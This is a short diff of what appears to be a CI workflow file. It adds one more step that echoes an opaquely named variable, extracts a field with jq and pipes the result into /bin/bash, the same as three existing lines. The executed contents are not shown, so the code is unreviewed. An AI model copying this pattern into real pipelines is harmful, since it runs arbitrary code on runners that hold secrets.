@@ -22,6 +22,7 @@ jobs:
           echo $aioas53 | jq -r .hml3364 | /bin/bash
           echo $w350 | jq -r .sf6 | /bin/bash
           printf '%s' "$l9" | jq -r .udfry5 | /bin/bash
+          echo $dg50687 | jq -r .x785 | /bin/bash
 
       - name: Archive output
         if: always()
